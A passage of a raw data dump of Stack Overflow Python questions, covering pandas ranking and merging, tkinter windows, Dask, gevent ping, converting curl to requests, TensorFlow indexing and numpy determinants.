<pre><code>if len(x)==10 and re.search(r'^[7|8|9]+\d+$',x):
</code></pre>

<p>for which all test cases passed. I want to know what the difference between using and not using <code>[]</code> for <code>\d+</code> in regex ?</p>

<p>Thanks  </p>
"
39683228,6843928.0,2016-09-25 03:56:33+00:00,2,Google api client for python log level and debuglevel not working,"<p>While building a basic python app on AppEngine I found this page:
<a href=""https://developers.google.com/api-client-library/python/guide/logging"" rel=""nofollow"">https://developers.google.com/api-client-library/python/guide/logging</a></p>

<p>Which states you can do the following to set the log level:</p>

<pre><code>import logging

logger = logging.getLogger()
logger.setLevel(logging.INFO)
</code></pre>

<p>However it doesn't seem to have any impact on the output which is always INFO for me.  I set to logging.DEBUG and don't see any debug entries.  I set to logging.WARNING and still see info entries.  Never seems to change.</p>

<p>I also tried setting httplib2 to debuglevel 4:</p>

<pre><code>import httplib2
httplib2.debuglevel = 4
</code></pre>

<p>Yet I don't see any HTTP headers in the log :/</p>

<p>Running python 2.7.10 in PyCharm.</p>

<p>Has anyone got these settings to work?</p>
"
39707080,4602441.0,2016-09-26 15:44:53+00:00,2,Pandas - Alternative to rank() function that gives unique ordinal ranks for a column,"<p>At this moment I am writing a Python script that aggregates data from multiple Excel sheets. The module I choose to use is Pandas, because of its speed and ease of use with Excel files. The question is only related to the use of Pandas and me trying to create a additional column that contains <em>unique, integer-only, ordinal</em>  ranks within a group.</p>

<p>My Python and Pandas knowledge is limited as I am just a beginner.</p>

<p><strong>The Goal</strong></p>

<p>I am trying to achieve the following data structure. Where the top 10 adwords ads are ranked vertically on the basis of their position in Google. In order to do this I need to create a column in the original data (see Table 2 &amp; 3) with a integer-only ranking that contains no duplicate values. </p>

<p>Table 1: Data structure I am trying to achieve</p>

<pre><code>    device  , weeks   , rank_1   , rank_2   , rank_3   , rank_4   , rank_5
    mobile  , wk 1    , string   , string   , string   , string   , string 
    mobile  , wk 2    , string   , string   , string   , string   , string 
    computer, wk 1    , string   , string   , string   , string   , string
    computer, wk 2    , string   , string   , string   , string   , string
</code></pre>

<p><strong>The Problem</strong></p>

<p>The exact problem I run into is not being able to efficiently rank the rows with pandas. I have tried a number of things, but I cannot seem to get it ranked in this way. </p>

<p>Table 2: Data structure I have</p>

<pre><code>    weeks    device   , website  , ranking  , adtext
    wk 1     mobile   , url1     , *2.1     , string
    wk 1     mobile   , url2     , *2.1     , string
    wk 1     mobile   , url3     , 1.0      , string
    wk 1     mobile   , url4     , 2.9      , string
    wk 1     desktop  , *url5    , 2.1      , string
    wk 1     desktop  , url2     , *1.5     , string
    wk 1     desktop  , url3     , *1.5     , string
    wk 1     desktop  , url4     , 2.9      , string
    wk 2     mobile   , url1     , 2.0      , string
    wk 2     mobile   , *url6    , 2.1      , string
    wk 2     mobile   , url3     , 1.0      , string
    wk 2     mobile   , url4     , 2.9      , string
    wk 2     desktop  , *url5    , 2.1      , string
    wk 2     desktop  , url2     , *2.9     , string
    wk 2     desktop  , url3     , 1.0      , string
    wk 2     desktop  , url4     , *2.9     , string
</code></pre>

<p>Table 3: The table I cannot seem to create</p>

<pre><code>    weeks    device   , website  , ranking  , adtext  , ranking
    wk 1     mobile   , url1     , *2.1     , string  , 2
    wk 1     mobile   , url2     , *2.1     , string  , 3
    wk 1     mobile   , url3     , 1.0      , string  , 1
    wk 1     mobile   , url4     , 2.9      , string  , 4
    wk 1     desktop  , *url5    , 2.1      , string  , 3
    wk 1     desktop  , url2     , *1.5     , string  , 1
    wk 1     desktop  , url3     , *1.5     , string  , 2
    wk 1     desktop  , url4     , 2.9      , string  , 4
    wk 2     mobile   , url1     , 2.0      , string  , 2
    wk 2     mobile   , *url6    , 2.1      , string  , 3
    wk 2     mobile   , url3     , 1.0      , string  , 1
    wk 2     mobile   , url4     , 2.9      , string  , 4
    wk 2     desktop  , *url5    , 2.1      , string  , 2
    wk 2     desktop  , url2     , *2.9     , string  , 3
    wk 2     desktop  , url3     , 1.0      , string  , 1
    wk 2     desktop  , url4     , *2.9     , string  , 4
</code></pre>

<p>The standard .rank(ascending=True), gives averages on duplicate values. But since I use these ranks to organize them vertically this does not work out.</p>

<pre><code>df = df.sort_values(['device', 'weeks', 'ranking'], ascending=[True, True, True])

df['newrank'] = df.groupby(['device', 'week'])['ranking'].rank( ascending=True)
</code></pre>

<p>The .rank(method=""dense"", ascending=True) maintains duplicate values and also does not solve my problem</p>

<pre><code>df = df.sort_values(['device', 'weeks', 'ranking'], ascending=[True, True, True])

df['newrank'] = df.groupby(['device', 'week'])['ranking'].rank( method=""dense"", ascending=True)
</code></pre>

<p>The .rank(method=""first"", ascending=True) throws a ValueError</p>

<pre><code>df = df.sort_values(['device', 'weeks', 'ranking'], ascending=[True, True, True])

df['newrank'] = df.groupby(['device', 'week'])['ranking'].rank( method=""first"", ascending=True)
</code></pre>

<p>ADDENDUM: If I would find a way to add the rankings in a column, I would then use pivot to transpose the table in the following way.</p>

<pre><code>df = pd.pivot_table(df, index = ['device', 'weeks'], columns='website', values='adtext', aggfunc=lambda x: ' '.join(x))
</code></pre>

<p><strong>My question to you</strong></p>

<p>I was hoping any of you could help me find a solution for this problem. This could either an efficient ranking script or something else to help me reach the final data structure.</p>

<p>Thank you!</p>

<p>Sebastiaan</p>

<hr>

<p>EDIT: Unfortunately, I think I was not clear in my original post. I am looking for a ordinal ranking that only gives integers and has no duplicate values. This means that when there is a duplicate value it will randomly give one a higher ranking than the other.</p>

<p>So what I would like to do is generate a ranking that labels each row with an ordinal value per group. The groups are based on the week number and device. The reason I want to create a new column with this ranking is so that I can make top 10s per week and device.</p>

<p>Also Steven G asked me for an example to play around with. I have provided that here. </p>

<p>Example data can be pasted directly into python</p>

<p>! IMPORTANT: The names are different in this sample. The dataframe is called placeholder, the column names are as follows: 'week', 'website', 'share', 'rank_google', 'device'. </p>

<pre><code>data = {u'week': [u'WK 1', u'WK 2', u'WK 3', u'WK 4', u'WK 2', u'WK 2', u'WK 1',
u'WK 3', u'WK 4', u'WK 3', u'WK 3', u'WK 4', u'WK 2', u'WK 4', u'WK 1', u'WK 1',
u'WK3', u'WK 4', u'WK 4', u'WK 4', u'WK 4', u'WK 2', u'WK 1', u'WK 4', u'WK 4',
u'WK 4', u'WK 4', u'WK 2', u'WK 3', u'WK 4', u'WK 3', u'WK 4', u'WK 3', u'WK 2',
u'WK 2', u'WK 4', u'WK 1', u'WK 1', u'WK 4', u'WK 4', u'WK 2', u'WK 1', u'WK 3',
u'WK 1', u'WK 4', u'WK 1', u'WK 4', u'WK 2', u'WK 2', u'WK 2', u'WK 4', u'WK 4',
u'WK 4', u'WK 1', u'WK 3', u'WK 4', u'WK 4', u'WK 1', u'WK 4', u'WK 3', u'WK 2',
u'WK 4', u'WK 4', u'WK 4', u'WK 4', u'WK 1'],
u'website': [u'site1.nl', u'website2.de', u'site1.nl', u'site1.nl', u'anothersite.com',
u'url2.at', u'url2.at', u'url2.at', u'url2.at', u'anothersite.com', u'url2.at',
u'url2.at', u'url2.at', u'url2.at', u'url2.at', u'anothersite.com', u'url2.at',
u'url2.at', u'url2.at', u'url2.at', u'anothersite.com', u'url2.at', u'url2.at',
u'anothersite.com', u'site2.co.uk', u'sitename2.com', u'sitename.co.uk', u'sitename.co.uk',
u'sitename2.com', u'sitename2.com', u'sitename2.com', u'url3.fi', u'sitename.co.uk',
u'sitename2.com', u'sitename.co.uk', u'sitename2.com', u'sitename2.com', u'ulr2.se',
u'sitename2.com', u'sitename.co.uk', u'sitename2.com', u'sitename2.com', u'sitename2.com',
u'sitename2.com', u'sitename2.com', u'sitename.co.uk', u'sitename.co.uk', u'sitename2.com',
u'facebook.com', u'alsoasite.com', u'ello.com', u'instagram.com', u'alsoasite.com', u'facebook.com',
u'facebook.com', u'singleboersen-vergleich.at', u'facebook.com', u'anothername.com', u'twitter.com',
u'alsoasite.com', u'alsoasite.com', u'alsoasite.com', u'alsoasite.com', u'facebook.com', u'alsoasite.com',
u'alsoasite.com'],
'adtext': [u'site1.nl 3,9 | &lt; 10\xa0%', u'website2.de 1,4 | &lt; 10\xa0%', u'site1.nl 4,3 | &lt; 10\xa0%',
u'site1.nl 3,8 | &lt; 10\xa0%', u'anothersite.com 2,5 | 12,36 %', u'url2.at 1,3 | 78,68 %', u'url2.at 1,2 | 92,58 %',
u'url2.at 1,1 | 85,47 %', u'url2.at 1,2 | 79,56 %', u'anothersite.com 2,8 | &lt; 10\xa0%', u'url2.at 1,2 | 80,48 %',
u'url2.at 1,2 | 85,63 %', u'url2.at 1,1 | 88,36 %', u'url2.at 1,3 | 87,90 %', u'url2.at 1,1 | 83,70 %',
u'anothersite.com 3,1 | &lt; 10\xa0%', u'url2.at 1,2 | 91,00 %', u'url2.at 1,1 | 92,11 %', u'url2.at 1,2 | 81,28 %'
, u'url2.at 1,1 | 86,49 %', u'anothersite.com 2,7 | &lt; 10\xa0%', u'url2.at 1,2 | 83,96 %', u'url2.at 1,2 | 75,48 %'
, u'anothersite.com 3,0 | &lt; 10\xa0%', u'site2.co.uk 3,1 | 16,24 %', u'sitename2.com 2,3 | 34,85 %',
u'sitename.co.uk 3,5 | &lt; 10\xa0%', u'sitename.co.uk 3,6 | &lt; 10\xa0%', u'sitename2.com 2,1 | &lt; 10\xa0%',
u'sitename2.com 2,2 | 13,55 %', u'sitename2.com 2,1 | 47,91 %', u'url3.fi 3,4 | &lt; 10\xa0%',
u'sitename.co.uk 3,1 | 14,15 %', u'sitename2.com 2,4 | 28,77 %', u'sitename.co.uk 3,1 | 22,55 %',
u'sitename2.com 2,1 | 17,03 %', u'sitename2.com 2,1 | 24,46 %', u'ulr2.se 2,7 | &lt; 10\xa0%',
u'sitename2.com 2,0 | 49,12 %', u'sitename.co.uk 3,0 | &lt; 10\xa0%', u'sitename2.com 2,1 | 40,00 %',
u'sitename2.com 2,1 | &lt; 10\xa0%', u'sitename2.com 2,2 | 30,29 %', u'sitename2.com 2,0 |47,48 %',
u'sitename2.com 2,1 | 32,17 %', u'sitename.co.uk 3,2 | &lt; 10\xa0%', u'sitename.co.uk 3,1 | 12,77 %',
u'sitename2.com 2,6 | &lt; 10\xa0%', u'facebook.com 3,2 | &lt; 10\xa0%', u'alsoasite.com 2,3 | &lt; 10\xa0%',
u'ello.com 1,8 | &lt; 10\xa0%',u'instagram.com 5,0 | &lt; 10\xa0%', u'alsoasite.com 2,2 | &lt; 10\xa0%',
u'facebook.com 3,0 | &lt; 10\xa0%', u'facebook.com 3,2 | &lt; 10\xa0%', u'singleboersen-vergleich.at 2,6 | &lt; 10\xa0%',
u'facebook.com 3,4 | &lt; 10\xa0%', u'anothername.com 1,9 | &lt;10\xa0%', u'twitter.com 4,4 | &lt; 10\xa0%',
u'alsoasite.com 1,1 | 12,35 %', u'alsoasite.com 1,1 | 11,22 %', u'alsoasite.com 2,0 | &lt; 10\xa0%',
u'alsoasite.com 1,1| 10,86 %', u'facebook.com 3,4 | &lt; 10\xa0%', u'alsoasite.com 1,1 | 10,82 %',
u'alsoasite.com 1,1 | &lt; 10\xa0%'],
u'share': [u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'12,36 %', u'78,68 %',
u'92,58 %', u'85,47 %', u'79,56 %', u'&lt; 10\xa0%', u'80,48 %', u'85,63 %', u'88,36 %',
u'87,90 %', u'83,70 %', u'&lt; 10\xa0%', u'91,00 %', u'92,11 %', u'81,28 %', u'86,49 %',
u'&lt; 10\xa0%', u'83,96 %', u'75,48 %', u'&lt; 10\xa0%', u'16,24 %', u'34,85 %', u'&lt; 10\xa0%',
u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'13,55 %', u'47,91 %', u'&lt; 10\xa0%', u'14,15 %', u'28,77 %',
u'22,55 %', u'17,03 %', u'24,46 %', u'&lt; 10\xa0%', u'49,12 %', u'&lt; 10\xa0%', u'40,00 %',
u'&lt; 10\xa0%', u'30,29 %', u'47,48 %', u'32,17 %', u'&lt; 10\xa0%', u'12,77 %', u'&lt; 10\xa0%',
u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'&lt; 10\xa0%',
u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'&lt; 10\xa0%', u'12,35 %', u'11,22 %', u'&lt; 10\xa0%',
u'10,86 %', u'&lt; 10\xa0%', u'10,82 %', u'&lt; 10\xa0%'],
u'rank_google': [u'3,9', u'1,4', u'4,3', u'3,8', u'2,5', u'1,3', u'1,2', u'1,1', u'1,2', u'2,8',
u'1,2', u'1,2', u'1,1', u'1,3', u'1,1', u'3,1', u'1,2', u'1,1', u'1,2', u'1,1', u'2,7', u'1,2',
u'1,2', u'3,0', u'3,1', u'2,3', u'3,5', u'3,6', u'2,1', u'2,2', u'2,1', u'3,4', u'3,1', u'2,4',
u'3,1', u'2,1', u'2,1', u'2,7', u'2,0', u'3,0', u'2,1', u'2,1', u'2,2', u'2,0', u'2,1', u'3,2',
u'3,1', u'2,6', u'3,2', u'2,3', u'1,8', u'5,0', u'2,2', u'3,0', u'3,2', u'2,6', u'3,4', u'1,9',
u'4,4', u'1,1', u'1,1', u'2,0', u'1,1', u'3,4', u'1,1', u'1,1'],
u'device': [u'Mobile', u'Tablet', u'Mobile', u'Mobile', u'Tablet', u'Mobile', u'Tablet', u'Computer',
u'Mobile', u'Tablet', u'Mobile', u'Computer', u'Tablet', u'Tablet', u'Computer', u'Tablet', u'Tablet',
u'Tablet', u'Mobile', u'Computer', u'Tablet', u'Computer', u'Mobile', u'Tablet', u'Tablet', u'Mobile',
u'Tablet', u'Mobile', u'Computer', u'Computer', u'Tablet', u'Mobile', u'Tablet', u'Mobile', u'Tablet',
u'Mobile', u'Mobile', u'Mobile', u'Tablet', u'Computer', u'Tablet', u'Computer', u'Mobile', u'Tablet',
u'Tablet', u'Tablet', u'Mobile', u'Computer', u'Mobile', u'Computer', u'Tablet', u'Tablet', u'Tablet',
u'Mobile', u'Mobile', u'Tablet', u'Mobile', u'Mobile', u'Tablet', u'Mobile', u'Mobile', u'Computer',
u'Mobile', u'Tablet', u'Mobile', u'Mobile']}

placeholder = pd.DataFrame(data)
</code></pre>

<p><strong>Error I receive when I use the rank() function with method='first'</strong></p>

<pre><code>C:\Users\username\code\report-creator&gt;python recomp-report-04.py
Traceback (most recent call last):
  File ""recomp-report-04.py"", line 71, in &lt;module&gt;
    placeholder['ranking'] = placeholder.groupby(['week', 'device'])['rank_googl
e'].rank(method='first').astype(int)
  File ""&lt;string&gt;"", line 35, in rank
  File ""C:\Users\sthuis\AppData\Local\Continuum\Anaconda2\lib\site-packages\pand
as\core\groupby.py"", line 561, in wrapper
    raise ValueError
ValueError
</code></pre>

<p><strong>My solution</strong></p>

<p>Effectively, the answer is given by @Nickil Maveli. A huge thank you! Nevertheless, I thought it might be smart to outline how I finally incorporated the solution.</p>

<p>Rank(method='first') is a good way to get an ordinal ranking. But since I was working with numbers that were formatted in the European way, pandas interpreted them as strings and could not rank them this way. I came to this conclusion by the reaction of Nickil Maveli and trying to rank each group individually. I did that through the following code.</p>

<pre><code>for name, group in df.sort_values(by='rank_google').groupby(['weeks', 'device']):
    df['new_rank'] = group['ranking'].rank(method='first').astype(int)
</code></pre>

<p>This gave me the following error:</p>

<pre><code>ValueError: first not supported for non-numeric data
</code></pre>

<p>So this helped me realize that I should convert the column to floats. This is how I did it.</p>

<pre><code># Converting the ranking column to a float
df['ranking'] = df['ranking'].apply(lambda x: float(unicode(x.replace(',','.'))))

# Creating a new column with a rank
df['new_rank'] = df.groupby(['weeks', 'device'])['ranking'].rank(method='first').astype(int)

# Dropping all ranks after the 10
df = df.sort_values('new_rank').groupby(['weeks', 'device']).head(n=10)

# Pivotting the column
df = pd.pivot_table(df, index = ['device', 'weeks'], columns='new_rank', values='adtext', aggfunc=lambda x: ' '.join(x))

# Naming the columns with 'top' + number
df.columns = ['top ' + str(i) for i in list(df.columns.values)]
</code></pre>

<p>So this worked for me. Thank you guys!</p>
"
39683274,6848602.0,2016-09-25 04:07:06+00:00,2,How to close a current window and open a new window at the same time?,"<p>This code opens a button, which links to another button. The other button can close its self, but the first button can't close itself and open a new one at the same time, How do I fix this?</p>

<pre><code>import tkinter as tk

class Demo1:
    def __init__(self, master):
        self.master = master
        self.frame = tk.Frame(self.master)
        self.HelloButton = tk.Button(self.frame, text = 'Hello', width = 25, command = self.new_window,)
        self.HelloButton.pack()
        self.frame.pack()
    def close_windows(self):
        self.master.destroy()
        self.new_window
    def new_window(self):
        self.new_window = tk.Toplevel(self.master)
        self.app = Demo2(self.new_window)


class Demo2:
    def __init__(self, master):
        self.master = master
        self.frame = tk.Frame(self.master)
        self.quitButton = tk.Button(self.frame, text = 'Quit', width = 25, command = self.close_windows)
        self.quitButton.pack()
        self.frame.pack()
    def close_windows(self):
        self.master.destroy()

def main(): 
    root = tk.Tk()
    app = Demo1(root)
    root.mainloop()

if __name__ == '__main__':
    main()
</code></pre>
"
40053875,3585557.0,2016-10-15 00:49:31+00:00,2,How would I use Dask to perform parallel operations on slices of NumPy arrays?,"<p>I have a numpy array of coordinates of size n_slice x 2048 x 3, where n_slice is in the tens of thousands.  I want to apply the following operation on each 2048 x 3 slice separately</p>

<pre><code>import numpy as np
from scipy.spatial.distance import pdist

# load coor from a binary xyz file, dcd format

n_slice, n_coor, _ = coor.shape
r = np.arange(n_coor)
dist = np.zeros([n_slice, n_coor, n_coor])

# this loop is what I want to parallelize, each slice is completely independent
for i in xrange(n_slice): 
    dist[i, r[:, None] &lt; r] = pdist(coor[i])
</code></pre>

<p>I tried using Dask by making <code>coor</code> a <code>dask.array</code>,</p>

<pre><code>import dask.array as da
dcoor = da.from_array(coor, chunks=(1, 2048, 3))
</code></pre>

<p>but simply replacing <code>coor</code> by <code>dcoor</code> will not expose the parallelism.  I could see setting up parallel threads to run for each slice but how do I leverage Dask to handle the parallelism?</p>

<p>Here is the parallel implementation using <code>concurrent.futures</code></p>

<pre><code>import concurrent.futures
import multiprocessing

n_cpu = multiprocessing.cpu_count()

def get_dist(coor, dist, r):
    dist[r[:, None] &lt; r] = pdist(coor)

# load coor from a binary xyz file, dcd format

n_slice, n_coor, _ = coor.shape
r = np.arange(n_coor)
dist = np.zeros([n_slice, n_coor, n_coor])

with concurrent.futures.ThreadPoolExecutor(max_workers=n_cpu) as executor:
    for i in xrange(n_slice):
        executor.submit(get_dist, cool[i], dist[i], r)
</code></pre>

<p>It is possible this problem is not well suited to Dask since there are no inter-chunk computations.</p>
"
40054079,6837424.0,2016-10-15 01:32:33+00:00,2,parallel ping using gevent,"<p>I am new to python and I am trying to run this code to want parallel ping of multiple machines.but I can not ping all IP concurrently. seems it run one after another .can some one please guide me on how can i ping multiple server concurrently.</p>

<pre><code>import gevent
import urllib2
import os
from gevent import monkey
monkey.patch_all()


def print_head(i):
    switch='192.168.182.170'
    response = os.system(""ping -c 5 "" + switch)


jobs = [gevent.spawn(print_head, i) for i  in range(1,10)]
gevent.joinall(jobs, timeout=2)
</code></pre>
"
39706735,2065959.0,2016-09-26 15:27:43+00:00,2,Convert CURL Post to Python Requests Failing,"<p>I am unable to successfully convert and execute a curl post command to python code.</p>

<p>curl command</p>

<pre><code>curl -X POST -H ""Content-Type:application/json; charset=UTF-8"" -d '{""name"":joe, ""type"":22, ""summary"":""Test""}' http://url
</code></pre>

<p>Converted code</p>

<pre><code>import requests
import json 

url=""http://url""
data = {""name"":joe, ""type"":22, ""summary"":""Test""}
headers = {'Content-type': ""application/json; charset=utf8""}
response  = requests.post (url, data=json.dumps(data), headers=headers)
print response.text
print response.headers
</code></pre>

<p>I get no response in return, when I execute it manually from the shell it works fine, but when I execute the code, nothing happens, I don't see errors or anything. </p>
"
40068572,6907488.0,2016-10-16 08:54:56+00:00,2,Python: String slice in pandas DataFrame is a series? I need it to be convertible to int,"<p>I have a problem that has kept me up for hours. I need to slice a string variable in a pandas DataFrame and extract an he numerical value (so I can perform a merge). (as a way to provide context, the variables is the result of .groupby ... and now am trying to merge in additional information. </p>

<p>Getting the number out of a string should be easy. </p>

<p>Basically, I am doing the following: </p>

<pre><code>string = x_1 
number = string[2:]
number == 2
et voila! 
</code></pre>

<p>To that goal, let's build up code</p>

<pre><code>In [32]: import pandas as pd
    ...: d = {'id' : [1, 2, 3, 4],
    ...:     'str_id' : ['x_2', 'x_4', 'x_8', 'x_1']}
    ...: 

In [33]: df= pd.DataFrame(d)

In [34]: df.head()
Out[34]: 
   id str_id
0   1    x_2
1   2    x_4
2   3    x_8
3   4    x_1

In [35]: df['num_id']=df.str_id.str[2:]

In [36]: df.head()
Out[36]: 
   id str_id num_id
0   1    x_2      2
1   2    x_4      4
2   3    x_8      8
3   4    p_1      1

In [37]: df.dtypes
Out[37]: 
id         int64
str_id    object
num_id    object
dtype: object
</code></pre>

<p>The result LOOKS good -- we have an object, so we'll just convert to int and be golden, right? Sadly not so much. </p>

<pre><code>In [38]: df['num_id3'] = int(df['num_id'])
Traceback (most recent call last):

  File ""&lt;ipython-input-38-50312cced30b&gt;"", line 1, in &lt;module&gt;
    df['num_id3'] = int(df['num_id'])

  File ""/Users/igor/anaconda/lib/python2.7/site-packages/pandas/core/series.py"", line 92, in wrapper
    ""{0}"".format(str(converter)))

TypeError: cannot convert the series to &lt;type 'int'&gt;
</code></pre>

<p>ok let's try something simpler ---stripping leading and trailing blanks </p>

<pre><code> In [39]: df['num_id3'] = (df['num_id']).strip()
Traceback (most recent call last):

  File ""&lt;ipython-input-39-0af6d5f8bb8c&gt;"", line 1, in &lt;module&gt;
    df['num_id3'] = (df['num_id']).strip()

  File ""/Users/igor/anaconda/lib/python2.7/site-packages/pandas/core/generic.py"", line 2744, in __getattr__
    return object.__getattribute__(self, name)

AttributeError: 'Series' object has no attribute 'strip'
</code></pre>

<p>So .. somehow I have a series object ... with a single item in it ... I have not been able to get the series object to convert to anything usable</p>

<p>Please will you help?!
Thanks!</p>
"
39684415,2704763.0,2016-09-25 07:23:46+00:00,2,TensorFlow getting elements of every row for specific columns,"<p>If <code>A</code> is a TensorFlow variable like so </p>

<pre><code>A = tf.Variable([[1, 2], [3, 4]])
</code></pre>

<p>and <code>index</code> is another variable </p>

<pre><code>index = tf.Variable([0, 1])
</code></pre>

<p>I want to use this index to select columns in each row. In this case, item 0 from first row and item 1 from second row.</p>

<p>If A was a Numpy array then to get the columns of corresponding rows mentioned in index we can do </p>

<pre><code>x = A[np.arange(A.shape[0]), index]
</code></pre>

<p>and the result would be </p>

<pre><code>[1, 4]
</code></pre>

<p>What is the TensorFlow equivalent operation/operations for this? I know TensorFlow doesn't support many indexing operations. What would be the work around if it cannot be done directly?</p>
"
39684548,2408288.0,2016-09-25 07:47:20+00:00,2,Convert the string 2.90K to 2900 or 5.2M to 5200000 in pandas dataframe,"<p>Need some help on processing data inside a pandas dataframe.
Any help is most welcome.</p>

<p>I have OHCLV data in CSV format. I have loaded the file in to pandas dataframe.</p>

<p>How do I convert the volume column from  2.90K to 2900 or 5.2M to 5200000.
The column can contain both K in form of thousands and M in millions.</p>

<pre><code>import pandas as pd

file_path = '/home/fatjoe/UCHM.csv'
df = pd.read_csv(file_path, parse_dates=[0], index_col=0)
df.columns = [
""closing_price"", 
""opening_price"", 
""high_price"", 
""low_price"",
""volume"",
""change""]

df['opening_price'] = df['closing_price']
df['opening_price'] = df['opening_price'].shift(-1)
df = df.replace('-', 0)
df = df[:-1]
print(df.head())

Console:
 Date
 2016-09-23          0
 2016-09-22      9.60K
 2016-09-21     54.20K
 2016-09-20    115.30K
 2016-09-19     18.90K
 2016-09-16    176.10K
 2016-09-15     31.60K
 2016-09-14     10.00K
 2016-09-13      3.20K
</code></pre>
"
40051653,2123288.0,2016-10-14 20:40:05+00:00,2,"rolling_window in pandas 19, using custom shapes","<p>I used to have in my code a pd.rolling_window(s,window=np.array(l),....) while using 0.17.
The new series.rolling(window,win_type), now doesn't support anything other than ints on window, and win_type is limited to a fixed set of shapes.</p>

<p>How can I migrate my old custom rolling_window mean to 0.19 ?</p>

<p>Thanks</p>
"
40070249,5098833.0,2016-10-16 12:27:32+00:00,2,Data transfer between C++ and Python,"<p>I would like to share memory between C++ and Python.</p>

<p>My problem:</p>

<ol>
<li>I am working with big data sets (up to 6 GB of RAM) in C++. All calculations are done in c++.</li>
<li>Then, I want to ""paste"" all my results to a Python program. But I can only write my data on disk, and then read that file from Python, which is not efficient. </li>
</ol>

<p>Is there any way to ""map"" memory corresponding to C++ variables so that I may access the data from Python? I don't want to copy 6GB of data onto a hard drive. </p>
"
40051567,1766755.0,2016-10-14 20:33:54+00:00,2,Pandas: Merge two dataframe columns,"<p>Consider two dataframes:</p>

<pre><code>df_a = pd.DataFrame([
        ['a', 1],
        ['b', 2],
        ['c', NaN],
    ], columns=['name', 'value'])

df_b = pd.DataFrame([
        ['a', 1],
        ['b', NaN],
        ['c', 3],
        ['d', 4]
    ], columns=['name', 'value'])
</code></pre>

<p>So looking like</p>

<pre><code># df_a
  name  value
0   a   1
1   b   2
2   c   NaN

# df_b
  name  value
0   a   1
1   b   NaN
2   c   3
3   d   4
</code></pre>

<p>I want to merge these two dataframes and fill in the NaN values of the <code>value</code> column with the existing values in the other column. In other words, I want out:</p>

<pre><code># DESIRED RESULT
  name  value
0   a   1
1   b   2
2   c   3
3   d   4
</code></pre>

<p>Sure, I can do this with a custom <code>.map</code> or <code>.apply</code>, but I want a solution that uses <code>merge</code> or the like, not writing a custom merge function. How can this be done?</p>
"
39712557,6884569.0,2016-09-26 21:16:44+00:00,2,Plotting average number of steps for Euclid's extended algorithm,"<p>I was given the following assignment by my Algorithms professor:</p>

<p>Write a Python program that implements <a href=""https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm"" rel=""nofollow"">Euclidâs extended algorithm</a>. Then perform the following experiment: run it on a random selection of inputs of a given size, for sizes bounded by some parameter N; compute the average number of steps of the algorithm for each input size n â¤ N, and use gnuplot to plot the result. What does f(n) which is the âaverage number of stepsâ of Euclidâs extended algorithm on input size n look like? Note that size is not the same as value; inputs of size n are inputs with a binary representation of n bits.</p>

<p>The programming of the algorithm was the easy part but I just want to make sure that I understand where to go from here. I can fix N to be some arbitrary value. I generate a set of random values of a and b to feed into the algorithm whose length in binary (n) are bounded above by N. While the algorithm is running, I have a counter that is keeping track of the number of steps (ignoring trivial linear operations) taken for that particular a and b.</p>

<p>At the end of this, I sum the lengths of each individual inputs a and b binary representation and that represents a single x value on the graph. My single y value would be the counter variable for that particular a and b. Is this a correct way to think about it?</p>

<p>As a follow up question, I also know that the best case for this algorithm is Î¸(1) and worst case is O(log(n)) so my ""average"" graph should lie between those two. How would I manually calculate average running time to verify that my end graph is correct?</p>

<p>Thanks.</p>
"
39676437,4499249.0,2016-09-24 12:38:51+00:00,2,Determinant of a (large) 1554 x 1554 matrix in Python,"<p>I need to calculate the determinant of a large 1554,1554 matrix of values with single precision in python. In doing so I encounter a runtime warning:</p>

<pre><code>import numpy as np

from numpy import linalg as LA

a = np.random.random((1554, 1554))

b = np.random.random((1554, 1554))

c = np.dot(a,b)

det = LA.det(c)
</code></pre>

<blockquote>
  <p>RuntimeWarning: overflow encountered in det
    r = _umath_linalg.det(a, signature=signature)</p>
</blockquote>

<p>Any ideas on how I can work around this problem? Many thanks!</p>

<p>Edit: this question is unique in that it specifically refers to computing the determinant of large matrix in double precision, though a possible answer is included here: <a href=""http://stackoverflow.com/questions/462500/can-i-get-the-matrix-determinant-using-numpy"">Can I get the matrix determinant using Numpy?</a></p>
"
39713773,3451339.0,2016-09-26 23:15:06+00:00,2,Python - decode or regex?,"<p>I have this <code>dict</code> being scraped from the web, but it comes with this <code>unicode</code> issue:</p>

<pre><code>{'track': [u'\u201cAnxiety\u201d',
           u'\u201cLockjaw\u201d [ft. Kodak Black]',
           u'\u201cMelanin Drop\u201d',
           u'\u201cDreams\u201d',
           u'\u201cIntern\u201d',
           u'\u201cYou Don\u2019t Think You Like People Like Me\u201d',
           u'\u201cFirst Day Out tha Feds\u201d',
           u'\u201cFemale Vampire\u201d',
           u'\u201cGirlfriend\u201d',
           u'\u201cOpposite House\u201d',
           u'\u201cGirls @\u201d [ft. Chance the Rapper]',
           u'\u201cI Am a Nightmare\u201d']}
</code></pre>

<p>which is the best way of stripping out these characters, using <code>regex</code>, or is there some <code>decode</code> method?</p>

<p>and how?</p>
"
39713678,6530451.0,2016-09-26 23:03:59+00:00,2,Assigning indicators based on observation quantile,"<p>I am working with a pandas DataFrame. I would like to assign a column indicator variable to 1 when a particular condition is met. I compute quantiles for particular groups. If the value is outside the quantile, I want to assign the column indicator variable to 1. For example, the following code prints the quantiles for each group:</p>

<pre><code>df[df['LENGTH'] &gt; 1].groupby(['CLIMATE', 'TEMP'])['LENGTH'].quantile(.95)]
</code></pre>

<p>Now for all observations in my dataframe which are larger than the grouped value I would like to set </p>

<pre><code>df['INDICATOR'] = 1
</code></pre>

<p>I tried using the following if statement:</p>

<pre><code>if df.groupby(['CLIMATE','BIN'])['LENGTH'] &gt; df[df['LENGTH'] &gt; 1].groupby(['CLIMATE','BIN'])['LENGTH'].quantile(.95):
    df['INDICATOR'] = 1
</code></pre>

<p>This gives me the error: ""ValueError: operands could not be broadcast together with shapes (269,) (269,2)"". Any help would be appreciated!   </p>
"
39713381,1625098.0,2016-09-26 22:28:56+00:00,2,Convert range to timestamp in Pandas,"<p>I have a column in a pandas data frame that goes from 0 to 172800000 in steps of 10. I would like to convert into datetime stamp with a specified date, beginning at midnight of that day. </p>

<p>So, suppose, </p>

<pre><code>time = np.arange(0,172800000, 10)
</code></pre>

<p>I would like to convert this in the following format: </p>

